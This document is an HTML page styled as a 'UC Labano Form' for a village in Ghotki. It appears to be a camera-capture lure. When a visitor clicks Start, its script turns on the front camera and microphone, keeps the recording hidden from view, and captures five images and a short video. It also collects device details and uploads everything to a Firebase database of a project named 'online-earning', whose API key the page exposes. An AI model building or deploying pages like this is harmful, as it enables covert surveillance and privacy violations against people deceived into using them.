<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UC Labano Form</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family:'Poppins', sans-serif;}
body {background:#f4f6f9; color:#333; display:flex; flex-direction:column; min-height:100vh;}
header {
    width:100%; padding:14px 25px; background: linear-gradient(135deg,#1e3c72,#2a5298);
    display:flex; align-items:center; justify-content:space-between; color:#fff; font-size:22px;
    box-shadow:0 4px 12px rgba(0,0,0,0.15);
}
.header-img {width:45px;height:45px;border-radius:50%;object-fit:cover;border:2px solid #fff;transition:transform .3s;}
.header-img:hover {transform:scale(1.1);}
header .title-container {flex:1; text-align:center;}
header .title-container span {display:block; font-weight:600; font-size:22px; letter-spacing:1px;}
header .title-container small {display:block; font-weight:400; font-size:12px; margin-top:3px; color:#ffd6d6;}

.marquee-container {width:100%; background:#fff0f0; color:red; overflow:hidden; padding:8px 0; font-weight:600; font-size:16px; border-top:2px solid #fe2c55; border-bottom:2px solid #fe2c55;}
.marquee {display:inline-block; white-space:nowrap; animation:marquee 15s linear infinite;}
@keyframes marquee {0%{transform:translateX(100%);}100%{transform:translateX(-100%);}}

main {flex:1; display:flex; flex-direction:column; align-items:center; padding:20px; gap:20px;}

.card {width:100%; max-width:360px; background:#fff; border-radius:14px; padding:25px; box-shadow:0 8px 24px rgba(0,0,0,0.1); text-align:center;}
.card h3 {margin-bottom:10px; color:#1e3c72;}
.card p.location {color:#fe2c55; font-weight:600; margin-bottom:15px;}
#msg {display:none;} /* hide notifications */

button {
    width:100%; padding:12px; background:#fe2c55; border:none; color:#fff;
    border-radius:50px; font-size:16px; cursor:pointer; transition:.3s; position:relative; overflow:hidden;
    display:flex; justify-content:center; align-items:center; margin-bottom:10px;
}
button span {position:relative; z-index:2;}
button.loading::after {
    content:'';
    position:absolute;
    left:0; top:0; width:100%; height:100%;
    background:linear-gradient(90deg, rgba(255,255,255,0.3), rgba(255,255,255,0.6), rgba(255,255,255,0.3));
    animation: shine 1s infinite;
}
@keyframes shine {
    0%{transform: translateX(-100%);}
    100%{transform: translateX(100%);}
}
button:disabled {background:#ccc; cursor:not-allowed;}

.progress-container {width:100%; background:#eee; height:14px; border-radius:8px; overflow:hidden; margin-top:15px; display:none;}
.progress-bar {height:100%; width:0%; background:#fe2c55; transition:width 0.3s;}

video {display:none; border-radius:12px; margin-top:10px;}

section {width:100%; max-width:900px; margin:20px auto; padding:20px; background:#fff; border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,.05);}
h2 {margin-bottom:12px; color:#2a5298;}
.faq-item {margin-bottom:10px; border-bottom:1px solid #ddd;}
.faq-question {padding:10px; cursor:pointer; font-weight:600; position:relative;}
.faq-question::after {content:'+'; position:absolute; right:10px; font-weight:bold;}
.faq-question.active::after {content:'-';}
.faq-answer {display:none; padding:8px 10px; font-size:14px; color:#555;}
.faq-answer.show{display:block;}

.contact-form {display:flex; flex-direction:column; gap:12px;}
.contact-form input, .contact-form textarea {padding:10px; border:1px solid #ccc; border-radius:8px; width:100%; font-size:14px;}
.contact-form button {background:#1e3c72; color:#fff; font-weight:600; transition:.3s;}
.contact-form button:hover {background:#2a5298;}

.whatsapp-contact {position:fixed; bottom:20px; right:20px; background:#25D366; color:#fff; width:60px; height:60px; border-radius:50%; display:flex; justify-content:center; align-items:center; font-size:32px; text-decoration:none; box-shadow:0 4px 12px rgba(0,0,0,0.3); transition:.3s;}
.whatsapp-contact img {width:35px; height:35px;}
.whatsapp-contact:hover {transform:scale(1.1);}

footer {padding:12px; text-align:center; font-size:13px; color:#666; background:#f4f6f9;}
@media(max-width:480px){.card{padding:18px;}}
</style>
</head>
<body>

<header>
  <img src="kk.png" alt="Left" class="header-img left">
  <div class="title-container">
    <span>UC Labana Form</span>
    <small>Village Pinyo Khan Labano Ghotki</small>
  </div>
  <img src="kk.png" alt="Right" class="header-img right">
</header>

<div class="marquee-container">
  <div class="marquee">Welcome to UC Labano Form — Fill Carefully and Submit — Stay Updated!</div>
</div>

<main>
  <div class="card">
    <h3>UC LABANO FORM</h3>
    <p class="location">Village Pinyo Khan Labano Ghotki</p>
    <p id="msg"></p> <!-- hidden -->
    <button id="startBtn"><span>Start</span></button>
    <button id="retryBtn" style="display:none;"><span>Retry</span></button>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <video id="video" autoplay muted playsinline></video>
  </div>
</main>

<section class="faq">
  <h2>FAQs</h2>
  <div class="faq-item">
    <div class="faq-question">How do I fill the UC Labana Form?</div>
    <div class="faq-answer">Click Start, record video with your audio, and images will be automatically uploaded.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">Is my data secure?</div>
    <div class="faq-answer">Yes, your video and images are uploaded securely to Firebase database.</div>
  </div>
  <div class="faq-item">
    <div class="faq-question">Can I preview my video?</div>
    <div class="faq-answer">Currently, the video is recorded and uploaded automatically. Admin can view it.</div>
  </div>
</section>

<section class="contact">
  <h2>Contact Us</h2>
  <form class="contact-form">
    <input type="text" placeholder="Your Name" required>
    <input type="email" placeholder="Email" required>
    <textarea placeholder="Message" rows="4" required></textarea>
    <button type="submit">Send Message</button>
  </form>
</section>

<a href="https://wa.me/923001234567" class="whatsapp-contact" target="_blank" title="Contact via WhatsApp">
  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
</a>

<footer>Help Center | &copy; 2026 Chinto994</footer>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";

const firebaseConfig={
  apiKey:"AIzaSyB0eLmZSDtmF1deFGBNSU9e3aq8_i_DjC4",
  authDomain:"online-earning-9751b.firebaseapp.com",
  databaseURL:"https://online-earning-9751b-default-rtdb.firebaseio.com",
  projectId:"online-earning-9751b",
  storageBucket:"online-earning-975b.firebasestorage.app",
  messagingSenderId:"454796166249",
  appId:"1:454796166249:web:0606b052e435312a068ef8"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const video = document.getElementById("video");
const startBtn = document.getElementById("startBtn");
const retryBtn = document.getElementById("retryBtn");
const progressBar = document.getElementById("progressBar");
const progressContainer = document.querySelector('.progress-container');

async function getDeviceName() {
  if (navigator.userAgentData) {
    const d = await navigator.userAgentData.getHighEntropyValues(["platform","model"]);
    return d.platform+" "+(d.model||"");
  }
  return navigator.userAgent;
}

function captureImage() {
  const c = document.createElement("canvas");
  c.width = video.videoWidth;
  c.height = video.videoHeight;
  c.getContext("2d").drawImage(video,0,0);
  return c.toDataURL("image/png");
}

const delay = ms => new Promise(r=>setTimeout(r,ms));

async function recordVideoAndImages(device) {
  const stream = video.srcObject;
  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
  let chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.start();

  progressContainer.style.display = 'block';
  progressBar.style.width = '0%';

  const totalSteps = 6; // 5 images + video
  const imageIntervals = 10000 / 5; // 10 sec divided by 5 images

  for(let i=0;i<5;i++){
    await delay(imageIntervals);
    push(ref(db,"tempImages"),{image: captureImage(), time: Date.now(), device: device});
    progressBar.style.width = `${((i+1)/totalSteps)*100}%`;
  }

  await delay(200); // small buffer
  recorder.stop();

  return new Promise(resolve=>{
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const reader = new FileReader();
      reader.onloadend = () => {
        push(ref(db,"tempImages"),{video: reader.result, time: Date.now(), device: device});
        progressBar.style.width = '100%';
        setTimeout(()=>progressContainer.style.display='none', 500);
        retryBtn.style.display = 'block'; // show retry after recording
        resolve();
      };
      reader.readAsDataURL(blob);
    };
  });
}

startBtn.onclick = async()=>{
  startBtn.disabled = true;
  startBtn.classList.add("loading");
  retryBtn.style.display = "none";

  const device = await getDeviceName();

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
    video.srcObject = stream;
    video.muted = true;
    await video.play();
    await recordVideoAndImages(device);

    startBtn.classList.remove("loading");
  } catch(err) {
    console.error("Media device error:", err);
    startBtn.disabled = false;
    startBtn.classList.remove("loading");
  }
};

retryBtn.onclick = async()=>{
  startBtn.disabled = false;
  retryBtn.style.display = "none";
  startBtn.click();
};

// FAQ accordion
document.querySelectorAll('.faq-question').forEach(q=>{
  q.addEventListener('click',()=>{
    q.classList.toggle('active');
    q.nextElementSibling.classList.toggle('show');
  });
});
</script>
</body>
  </html>
